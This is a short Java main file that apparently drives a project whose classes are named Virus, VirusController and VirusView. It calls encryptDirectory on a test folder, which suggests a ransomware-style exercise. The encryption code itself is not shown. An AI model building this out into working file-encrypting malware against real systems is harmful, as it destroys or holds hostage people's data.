import Model.Virus;
import Controller.VirusController;
import View.VirusView;

import java.io.File;

public class Main {
    public static void main(String[] args) {
        Virus model = new Virus();
        VirusView view = new VirusView();
        VirusController controller = new VirusController(model, view);

        // Encrypt files in the specified directory
        File targetDir = new File("src/testdir");
        controller.encryptDirectory(targetDir);
    }
}
